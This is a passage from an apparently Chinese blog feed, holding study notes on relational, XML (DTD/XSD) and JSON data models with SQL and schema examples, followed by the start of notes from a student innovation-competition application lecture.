a <strong>type</strong> (or <strong>domain</strong>)</li></ol></blockquote><p>示例：</p><p>Student Table</p><div class="table-container"><table><thead><tr><th style="text-align:center">ID</th><th style="text-align:center">name</th><th style="text-align:center">gender</th><th style="text-align:center">GPA</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">Andrew</td><td style="text-align:center">male</td><td style="text-align:center">3.2</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">Shiroko</td><td style="text-align:center">female</td><td style="text-align:center">4.5</td></tr></tbody></table></div><h3 id="1-2-Relational-Model的应用"><a href="#1-2-Relational-Model的应用" class="headerlink" title="1.2 Relational Model的应用"></a>1.2 Relational Model的应用</h3><p><strong>字段的值允许不存在，即字段的值为NULL</strong></p><p><strong>NULL</strong>——special value for “unknown” or “undefined’</p><div class="table-container"><table><thead><tr><th style="text-align:center">ID</th><th style="text-align:center">name</th><th style="text-align:center">gender</th><th style="text-align:center">GPA</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">Andrew</td><td style="text-align:center">male</td><td style="text-align:center"><strong>NULL</strong></td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">Shiroko</td><td style="text-align:center"><strong>NULL</strong></td><td style="text-align:center">4.5</td></tr></tbody></table></div><p><strong>每一行需要有唯一标识</strong></p><p>唯一标识Key可以是一个unique的值，也可以是多个字段的组合是unique的值的组合</p><blockquote><p><strong>Key</strong>——attribute whose <strong>value is unique</strong> in each tuple Or <strong>set of attributes whose combined values are unique</strong></p></blockquote><p><strong>在SQL语句中创建表</strong></p><p>Create Table <strong>Student</strong>(<strong>ID</strong>, <strong>name</strong>, <strong>GPA</strong>, <strong>photo</strong>)</p><p>Create Table <strong>College</strong>(<strong>name string</strong>, <strong>state char(2)</strong>, <strong>enrollment integer</strong>)</p><h2 id="2-在Relational-Model中查询"><a href="#2-在Relational-Model中查询" class="headerlink" title="2. 在Relational Model中查询"></a>2. 在Relational Model中查询</h2><p>具体查询语言在后续学习，现展示两种语言的形式：</p><p>查找申请了斯坦福且GPA大于3.7的学生的ID：</p><p>1.关系代数(Relational Algebra)</p><script type="math/tex; mode=display">\Pi_{ID} \sigma_{GPA > 3.7 \wedge CNAME = 'Standford'} (Student \times Apply)</script><p>2.SQL</p><p>Select student.ID<br>From student, Apply<br>Where student.ID = Apply.ID<br>And GPA&gt;3.7 and college=’Stanford’</p><h1 id="二、XML-Extensible-Markup-Language"><a href="#二、XML-Extensible-Markup-Language" class="headerlink" title="二、XML(Extensible Markup Language)"></a>二、XML(Extensible Markup Language)</h1><h2 id="1-XML的介绍"><a href="#1-XML的介绍" class="headerlink" title="1. XML的介绍"></a>1. XML的介绍</h2><h3 id="1-1-XML的基本组成部分"><a href="#1-1-XML的基本组成部分" class="headerlink" title="1.1 XML的基本组成部分"></a>1.1 XML的基本组成部分</h3><ol><li>嵌套的标签元素</li><li>标签的属性</li><li>文本</li></ol><blockquote><p>Basic constructs</p><ol><li>Tagged elements(nested)</li><li>Attributes</li><li>Text</li></ol></blockquote><h3 id="1-2-well-formed-XML"><a href="#1-2-well-formed-XML" class="headerlink" title="1.2 well-formed XML"></a>1.2 well-formed XML</h3><p>well-formed XML满足的条件：</p><ul><li>根元素是唯一的</li><li>相互正确嵌套的标签（包括开始标志、结束标志）</li><li>元素内的参数是唯一的</li></ul><blockquote><p><strong>Adheres to basic structural requirements</strong></p><ul><li>Single root element</li><li>Matched tags, proper nesting</li><li>Unique attributes within elements</li></ul></blockquote><h3 id="1-3-“Valid”-XML"><a href="#1-3-“Valid”-XML" class="headerlink" title="1.3 “Valid” XML"></a>1.3 “Valid” XML</h3><p>“Valid” XML代表XML文件不仅满足well-formed XML的条件，同时也满足其他对内容的限制条件，这些条件主要有以下两种描述方式：</p><ol><li>Document Type Descriptor(DTD)</li><li>XML Schema (XSD)</li></ol><blockquote><p>Adheres to basic structural requirements<br>Also adheres to content-specific specification</p><ol><li>Document Type Descriptor(DTD)</li><li>XML Schema (XSD)</li></ol></blockquote><h2 id="2-DTD"><a href="#2-DTD" class="headerlink" title="2. DTD"></a>2. DTD</h2><p>根据视频中的DTD文件总结：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE rootName&gt;：定义根元素  </span><br><span class="line">&lt;!ELEMENT eleName&gt;：定义元素  </span><br><span class="line">&lt;!ATTLIST eleName attName1 attType1 #REQUIRED</span><br><span class="line">                  attName1 attType1 #IMPLIED&gt;</span><br><span class="line">定义元素下的属性，包括属性名，属性类型，#REQUIRED表示必要，#IMPLIED表示不必要</span><br><span class="line"></span><br><span class="line">通常用正则表达式中 | . * ? 等符号表示需要元素及其数量</span><br><span class="line"></span><br><span class="line">#PCDATA 表示需要被解析的数据</span><br><span class="line">CDATA 表示不需要被解析的数据</span><br><span class="line">IDREFS 元素的ID组成的列表</span><br><span class="line">ID 元素的ID</span><br></pre></td></tr></table></figure><br>更多关于DTD：<a href="https://www.runoob.com/dtd/dtd-tutorial.html">DTD 教程 | 菜鸟教程 (runoob.com)</a></p><p>示例（注释是自己写的QwQ）：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">Bookstore</span> [</span></span><br><span class="line"><span class="meta">    &lt;!-- 可包含多个Book和多个Magazine的Bookstore--&gt;</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">Bookstore</span> (<span class="keyword">Book</span>*, <span class="keyword">Magazine</span>*)&gt;</span></span></span><br><span class="line"><span class="meta">    </span></span><br><span class="line"><span class="meta">    &lt;!-- 包含一个Title和零/一个Remark的Book--&gt;</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">Book</span> (<span class="keyword">Title</span>, <span class="keyword">Remark</span>?)&gt;</span></span></span><br><span class="line"><span class="meta">    &lt;!-- Book的属性必须两个字符类型数据，以及作者的ID列表--&gt;</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ATTLIST <span class="keyword">Book</span> <span class="keyword">ISBN</span> <span class="keyword">CDATA</span> <span class="keyword">#REQUIRED</span></span></span></span><br><span class="line"><span class="meta"><span class="meta">                  <span class="keyword">Price</span> <span class="keyword">CDATA</span> <span class="keyword">#REQUIRED</span></span></span></span><br><span class="line"><span class="meta"><span class="meta">                  <span class="keyword">Authors</span> <span class="keyword">IDREFS</span> <span class="keyword">#IMPLIED</span>&gt;</span></span></span><br><span class="line"><span class="meta">                  </span></span><br><span class="line"><span class="meta">    &lt;!-- 包含一个Title的Magazine--&gt;</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">Magazine</span> (<span class="keyword">Title</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ATTLIST <span class="keyword">Magazine</span> <span class="keyword">Month</span> <span class="keyword">CDATA</span> <span class="keyword">#REQUIRED</span></span></span></span><br><span class="line"><span class="meta"><span class="meta">                       <span class="keyword">Year</span> <span class="keyword">CDATA</span> <span class="keyword">#REQUIRED</span>&gt;</span></span></span><br><span class="line"><span class="meta">                       </span></span><br><span class="line"><span class="meta">    &lt;!-- Title包含PCDATA Remark包含多个PCDATA或书的ID--&gt;</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">Title</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">Remark</span> (<span class="keyword">#PCDATA</span> | <span class="keyword">BookRef</span>)*&gt;</span></span></span><br><span class="line"><span class="meta">    </span></span><br><span class="line"><span class="meta">    &lt;!-- 只包含属性的空元素--&gt;</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">BookRef</span> <span class="keyword">EMPTY</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ATTLIST <span class="keyword">BoookRef</span> <span class="keyword">book</span> <span class="keyword">IDREF</span> <span class="keyword">#REQUIRED</span>&gt;</span></span></span><br><span class="line"><span class="meta">    </span></span><br><span class="line"><span class="meta">    &lt;!-- Author由 First_Name 和 LastName组成，同时必须一个属性作为ID--&gt;</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">Author</span> (<span class="keyword">First_Name</span>, <span class="keyword">Last_Name</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ATTLIST <span class="keyword">Author</span> <span class="keyword">Ident</span> <span class="keyword">ID</span> <span class="keyword">#REQUIRED</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">First_Name</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">Last_Name</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure></p><h2 id="3-XSD"><a href="#3-XSD" class="headerlink" title="3. XSD"></a>3. XSD</h2><p>参考：<a href="https://www.w3school.com.cn/schema/schema_example.asp">一个 XSD 实例 (w3school.com.cn)</a><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 文件头定义标准的xml声明，使其符合基本的xml结构--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xs:schema</span> <span class="attr">xmlns:xs</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;/<span class="name">xs:schema</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- -复杂类型的元素定义 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xs:element</span> <span class="attr">name</span>=<span class="string">&quot;eleName&quot;</span> <span class="attr">type</span>=<span class="string">&quot;complexTypeName&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xs:complexType</span> <span class="attr">name</span>=<span class="string">&quot;complexTypeName&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">xs:sequence</span>&gt;</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="tag">&lt;/<span class="name">xs:sequence</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">xs:attribute</span> <span class="attr">name</span>=<span class="string">&quot;attName&quot;</span> <span class="attr">type</span>=<span class="string">&quot;xs:string&quot;</span> <span class="attr">use</span>=<span class="string">&quot;required&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xs:complexType</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 简单类型的元素定义--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xs:element</span> <span class="attr">name</span>=<span class="string">&quot;eleName&quot;</span> <span class="attr">type</span>=<span class="string">&quot;xs:string&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">minOccurs</span>=<span class="string">&quot;0&quot;</span> <span class="attr">maxOccurs</span>=<span class="string">&quot;unbounded&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 元素的主键 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsd:key</span> <span class="attr">name</span>=<span class="string">&quot;eleNameKey&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsd:selector</span> <span class="attr">xpath</span>=<span class="string">&quot;eleName&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsd:field</span> <span class="attr">xpath</span>&quot;@<span class="attr">attName</span>&quot; /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsd:key</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 其他元素主键的引用 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsd:key</span> <span class="attr">name</span>=<span class="string">&quot;eleName3KeyRef&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;eleName3Key&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsd:selector</span> <span class="attr">xpath</span>=<span class="string">&quot;eleName1/eleName2/eleName3&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsd:field</span> <span class="attr">xpath</span>&quot;@<span class="attr">attName</span>&quot; /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsd:key</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h1 id="三、JSON-JavaScript-Object-Notation"><a href="#三、JSON-JavaScript-Object-Notation" class="headerlink" title="三、JSON(JavaScript Object Notation)"></a>三、JSON(JavaScript Object Notation)</h1><h2 id="1-JSON的介绍"><a href="#1-JSON的介绍" class="headerlink" title="1. JSON的介绍"></a>1. JSON的介绍</h2><h3 id="1-1-JSON的特点"><a href="#1-1-JSON的特点" class="headerlink" title="1.1 JSON的特点"></a>1.1 JSON的特点</h3><ol><li>是用于序列化数据对象的标准</li><li>可读性强，便于交流数据</li><li>能很好地表达和存储结构不那么严格的数据</li><li>不再于JavaScript绑定，并且能在许多编程语言中转换</li></ol><blockquote><ol><li>Standard for “serializing” data objects, usually in files</li><li>Human-readable, useful for data interchange</li><li>Also useful for representing &amp; storing semistructured data</li><li>No longer tied to JavaScript</li><li>Parsers for many languages</li></ol></blockquote><h3 id="1-2-JSON的基本组成部分"><a href="#1-2-JSON的基本组成部分" class="headerlink" title="1.2 JSON的基本组成部分"></a>1.2 JSON的基本组成部分</h3><p>JSON由以下成分递归定义</p><ol><li>基本类型<br>number, string, boolean, ..</li><li>对象 {}<br>对象包含键值对的集合，值可以是基本类型，也可以是数组和对象。</li><li>数组 []<br>数组包括一列表的值，可以是基本类型，也可以是数组和对象。</li></ol><blockquote><p>Basic constructs(recursive)</p><ol><li>Base values<br>number, string, boolean, ..</li><li>Objects {}<br>sets of label-value pairs</li><li>Arrays []<br>lists of values</li></ol></blockquote><h2 id="2-JSON-Schema"><a href="#2-JSON-Schema" class="headerlink" title="2. JSON Schema"></a>2. JSON Schema</h2><p>从示例看如何使用JSON Schema规范JSON的内容：<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;object&quot;</span><span class="punctuation">,</span> <span class="comment">//&quot;type&quot;: &quot;属性类型&quot;</span></span><br><span class="line">  <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span>  <span class="comment">//object接properties</span></span><br><span class="line">      <span class="attr">&quot;Books&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span> </span><br><span class="line">          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;array&quot;</span><span class="punctuation">,</span> <span class="comment">// array接items</span></span><br><span class="line">          <span class="attr">&quot;items&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">              <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;object&quot;</span><span class="punctuation">,</span> </span><br><span class="line">              <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span> </span><br><span class="line">                  <span class="attr">&quot;ISBN&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span> </span><br><span class="line">                      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span></span><br><span class="line">                      <span class="attr">&quot;pattern&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ISBN*&quot;</span> <span class="comment">//正则表达式匹配</span></span><br><span class="line">                  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;Price&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span> </span><br><span class="line">                      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;integer&quot;</span><span class="punctuation">,</span> </span><br><span class="line">                      <span class="attr">&quot;minimum&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span>  <span class="comment">//最小数量</span></span><br><span class="line">                      <span class="attr">&quot;maximum&quot;</span><span class="punctuation">:</span> <span class="number">200</span> <span class="comment">//最大数量</span></span><br><span class="line">                  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;Edition&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span> </span><br><span class="line">                      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;integer&quot;</span><span class="punctuation">,</span> </span><br><span class="line">                      <span class="attr">&quot;optional&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span> <span class="comment">//表示属性可选</span></span><br><span class="line">                  <span class="punctuation">&#125;</span><span class="punctuation">,</span> </span><br><span class="line"><span class="comment">// 省略</span></span><br></pre></td></tr></table></figure></p><h1 id="四、三种数据模型之间的比较"><a href="#四、三种数据模型之间的比较" class="headerlink" title="四、三种数据模型之间的比较"></a>四、三种数据模型之间的比较</h1><h2 id="1-Relational-Model、XML和JSON"><a href="#1-Relational-Model、XML和JSON" class="headerlink" title="1. Relational Model、XML和JSON"></a>1. Relational Model、XML和JSON</h2><div class="table-container"><table><thead><tr><th style="text-align:center"></th><th style="text-align:center">Relational</th><th style="text-align:center">XML</th><th style="text-align:center">JSON</th></tr></thead><tbody><tr><td style="text-align:center">Structure</td><td style="text-align:center">Tables <br/> 表</td><td style="text-align:center">hierarchical tree, or graph <br/> 多层次的树或图</td><td style="text-align:center">Nested Sets of Objects and Arrays <br/> 嵌套的对象和数组</td></tr><tr><td style="text-align:center">Schema</td><td style="text-align:center">Fixed in advance <br/> 固定</td><td style="text-align:center">“self-describing” Flexible <br/> 灵活</td><td style="text-align:center">“self-describing” Flexible <br/> 灵活</td></tr><tr><td style="text-align:center">Queries</td><td style="text-align:center">Some simple expressive languages <br/> 有容易表述的查询语言</td><td style="text-align:center">Less so <br/> 比关系模型要少</td><td style="text-align:center">None widely used till 2012-2 <br/> 到2012-2仍未有盛行的JSON查询语言</td></tr><tr><td style="text-align:center">Ordering</td><td style="text-align:center">None</td><td style="text-align:center">Implied</td><td style="text-align:center">Arrays</td></tr><tr><td style="text-align:center">Implementation</td><td style="text-align:center">Native systems <br/> 有原生实现关系模型的系统</td><td style="text-align:center">Add-on <br/> 作为关系型数据库的上一层的附加组件</td><td style="text-align:center">Coupled with programming language,<br/> used in NOSQL systems <br/> 常在编程语言中出现，或用于NOSQL系统</td></tr></tbody></table></div><h2 id="2-XML和JSON"><a href="#2-XML和JSON" class="headerlink" title="2. XML和JSON"></a>2. XML和JSON</h2><div class="table-container"><table><thead><tr><th style="text-align:center"></th><th style="text-align:center">XML</th><th style="text-align:center">JSON</th></tr></thead><tbody><tr><td style="text-align:center">Verbosity <br/> 冗长程度</td><td style="text-align:center">More <br/> 带结束标签</td><td style="text-align:center">Less</td></tr><tr><td style="text-align:center">Complexity <br/> 复杂性</td><td style="text-align:center">More <br/> 属性、子元素和文本</td><td style="text-align:center">Less</td></tr><tr><td style="text-align:center">Validity <br/> 校验器</td><td style="text-align:center">DTDs XSDs 常用</td><td style="text-align:center">JSON Schema 不常用</td></tr><tr><td style="text-align:center">Prog. Interface <br/> 编程语言接口</td><td style="text-align:center">Clunky “Impedence mismatch” <br/> 与编程语言中的数据结构不直接匹配</td><td style="text-align:center">More direct</td></tr><tr><td style="text-align:center">Querying <br/> 查询</td><td style="text-align:center">XPath XQuery XSLT</td><td style="text-align:center">不常用的各种提案</td></tr></tbody></table></div>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
            <tag> 关系型数据库 </tag>
            
            <tag> XML </tag>
            
            <tag> JSON </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>挑战杯网申培训讲座</title>
      <link href="/2024/01/23/%E6%8C%91%E6%88%98%E6%9D%AF%E7%BD%91%E7%94%B3%E5%9F%B9%E8%AE%AD%E8%AE%B2%E5%BA%A7/"/>
      <url>/2024/01/23/%E6%8C%91%E6%88%98%E6%9D%AF%E7%BD%91%E7%94%B3%E5%9F%B9%E8%AE%AD%E8%AE%B2%E5%BA%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>听了个学校双创训练营的挑战杯网申培训讲座，把截下来的ppt整理一下水一篇博客咦嘻嘻嘻</p><p>侵删</p><h1 id="一、赛道盘点"><a href="#一、赛道盘点" class="headerlink" title="一、赛道盘点"></a>一、赛道盘点</h1><h2 id="1-往届“挑战杯”获奖盘点"><a href="#1-往届“挑战杯”获奖盘点" class="headerlink" title="1. 往届“挑战杯”获奖盘点:"></a>1. 往届“挑战杯”获奖盘点:</h2><ol><li><p>共有来自3011所高校的142.4万名学生参赛，<br>累计提交33万余个创新创业项目，其中金奖项目154个，银奖项目309个，铜奖项目1079个  </p></li><li><p>各赛道获奖情况：<br>1、科技创新和未来产业: 42项金奖 (职业院校8项);<br>2、乡村振兴和农业农村现代化:31项(院校6项)<br>3、社会治理和公共服务: 36项 (职业院校6项);<br>无人机检测防控2、桥梁/山区弯道/基建3、医疗项目5(胃肠道检测/病理诊断/用药/癌症预防等)、乡村健康/女性健康3、留守儿童/孤独症2、防火减灾2、海洋河流检测2数据隐私1、中小学科普1、非遗1<br>4、生态环保和可持续发展: 25项 (院校4项)<br>双碳4、防生阻燃、催化剂4、结构纤维、水下机器人、喷雾、新能源、固废、降解及再生循环<br>5、文化创意和区城合作:20项 (业院校4项)</p></li><li><p>高校获奖情况<br>共有113所高校荣获金奖，北京理工大学以7金1银，金奖总数第一、总分第一的优异成绩捧得“挑战杯”，问鼎中国大学生创新创业竞赛最高集体荣誉5、华中科技大学、浙江大学、南京航空航天大学和天津大学各获得4项金奖，并列金奖数第二;浙江工业大学、西安交大3;北航/东北大学/广工/四川大学2</p></li></ol><h2 id="2-挑战杯参赛组别"><a href="#2-挑战杯参赛组别" class="headerlink" title="2. 挑战杯参赛组别"></a>2. 挑战杯参赛组别</h2><p><strong>科技创新和未来产业</strong>:突出科技创新，在人工智能、网络信息、生命科学、新材料新能源等领域;乡村振兴和农业农村现代化: 围绕实施乡村振兴战略，在农林牧渔、旅游休闲、电子商务、城乡融合等领域;</p><p><strong>城市治理和社会服务</strong>:围绕国家治理体系和治理能力现代化建设，政务服务、消费生活、公共卫生与医疗服务、金融与法律服务、教育培训、交通物流、金融服务等;</p><p><strong>生态环保和可持续发展</strong>:围绕可持续发展战略，在环境治理、可持续资源开发、生态环保、清洁能源应用等领域;</p><p><strong>文化创意和区域合作</strong>:突出共融、共享，围绕“一带一路”和京津冀、长三角、成渝经济圈及粤港澳大湾区等经济合作带建设，在工艺与设计、动漫广告、体育竞技和国际文化传播、对外交流培训、对外经贸等领域。</p><p>科创未来产业：看重专利、软著、产品的测试<br>乡村振兴和农业现代化：看重社会实践和案例<br>城市治理和社会服务：关注社会热点和共性问题，效果前vs效果后<br>生态环保可持续发展：展现应用场景应用效果<br>文创和区域合作：难衡量，突出合同订单营收  </p><h1 id="二、网申材料"><a href="#二、网申材料" class="headerlink" title="二、网申材料"></a>二、网申材料</h1><h2 id="1-网评提交材料"><a href="#1-网评提交材料" class="headerlink" title="1. 网评提交材料"></a>1. 网评提交材料</h2><p>1、申报书:社会价值、实践过程、创新意义、发展前景等</p><p>2、商业计划书: 市场背景、痛点、解决方案等(图表结合) <strong>省赛基本五十页+，大部分90-120</strong></p><p>3、附加材料(可不加，有更好<br>项目PPT、专利软著、合同订单、财务流水、到账证明等</p><p>4、图片视频(可不加，有更好</p><p>tip: 技术类要侧重于自己的专利和软著，老师的跟自己的悬殊不能太大</p><h2 id="2-评审要点"><a href="#2-评审要点" class="headerlink" title="2. 评审要点"></a>2. 评审要点</h2><p>1、社会价值</p><p><strong>核心点</strong>:社会贡献，社会价值，社会成效和社会影响力。<br><strong>概述</strong>:在科技创新、扶贫助困、社会民生、生态环保、交流合作等方面的社会贡献度，未来在持续吸纳、带动就业等方面的能力等。</p><p>2、实践过程  </p><p><strong>核心点</strong>:对于关键的时间点、实践过程要重点描述，可以时间点+事迹;<br><strong>概述</strong>:说明项目过程中进行的各项主要实践活动，尤其是深入一线的调研过程，包括产品研发、营销策略、调研实践、技术迭代、社会服务等。</p><p>3、创新意义</p><p><strong>核心点</strong>:技术、模式、管理、内容的创新性，凸显竞争性和不可替代性。<br><strong>概述</strong>:突出核心创新点和技术支撑材料，项目在科学技术、社会服务形式、商业模式、管理运营、应用场景等方面的创新程度</p><p>4、发展前景</p><p><strong>核心点</strong>:技术或模式有优势、市场规模和容量、政策背景支持、资金和人员可持续<br><strong>概述</strong>:项目商业模式、营销策略、财务管理、发展战略等方面设计完整合理。目标定位及市场分析清晰，盈利能力推导过程合理，能够实现可持续发展。</p><p>5、团队协作 </p><p><strong>核心点</strong>:团队成员 简要介绍，学生、指导老师、外部顾问，专创融合(专业教育和创新创业教育的契合度)等。<br><strong>概述</strong>:团队成员具体分工、专业特长、相关领域有什么成绩(核心成员和指导老师取得的成绩都是要和项目研究的领域有关)</p><h1 id="三、商业计划书"><a href="#三、商业计划书" class="headerlink" title="三、商业计划书"></a>三、商业计划书</h1><h2 id="0、-商业计划书要点"><a href="#0、-商业计划书要点" class="headerlink" title="0、 商业计划书要点"></a>0、 商业计划书要点</h2><p>1、项目概述项目简介等执行概要<br>2、市场分析:市场背景、市场痛点、市场需求、客户描述<br>3、产品服务:项目源起、产品介绍等<br>4、商业模式销售模式、盈利模式、推广策略<br>5、竞争分析:对手分析、竞争优势等<br>6、团队介绍:核心团队、专家顾问<br>7、财务分析:营收来源、财务预测<br>8、风险与对策:潜在风险、解决方案<br>9、发展规划:时间/产品维度、未来三年规划<br>10、附件:营业执照、合同、证书等</p><h2 id="1、发展前景-市场分析"><a href="#1、发展前景-市场分析" class="headerlink" title="1、发展前景/市场分析"></a>1、发展前景/市场分析</h2><p>主要内容:</p><p>1、描述项目<strong>直接</strong>相关的市场背景(行业背景、市场发展趋势市场空间等)<br>2、发现一个什么样的<strong>痛点(市场需求点 机会点)</strong> <strong>用数据讲痛点</strong><br>3、解决痛点的项目<strong>目标客户</strong>精准画像，(特征、数量、分布购买动机、购买能力等)</p><p>注意:<br>1、图文并茂、言简意骇。<br>2、数据精准详实，要求最新数据。</p><p>例：</p><p>项目背景/行业分析/市场分析/市场调查等</p><p>1、找出问题 (社会痛点)<br>2、问题的市场(作证材料)<br>第二章 市场痛点与规模<br>2.1 市场痛点<br>2.2 市场现状与规模<br>2.3 竞争分析<br>2.4 SWOT 分析  </p><h2 id="2、产品-服务内容"><a href="#2、产品-服务内容" class="headerlink" title="2、产品/服务内容"></a>2、产品/服务内容</h2><p>1、产品服务及内容:产品功能、组成或结构、服务对象、服务内容;<br>2、技术原理或核心技术:生产工艺流程、核心技术、知识产权(专利软著、商标等)<br>3、产品运用/解决思路: 产品前期测试、如何解决问题、实际效果如何  </p><p>注意:<br>图文并茂。产品设计图、产品实物图、产品模型图、手稿、服务流程图、服务实景图,产业链结构图等。</p><h2 id="3、商业模式及盈利模式"><a href="#3、商业模式及盈利模式" class="headerlink" 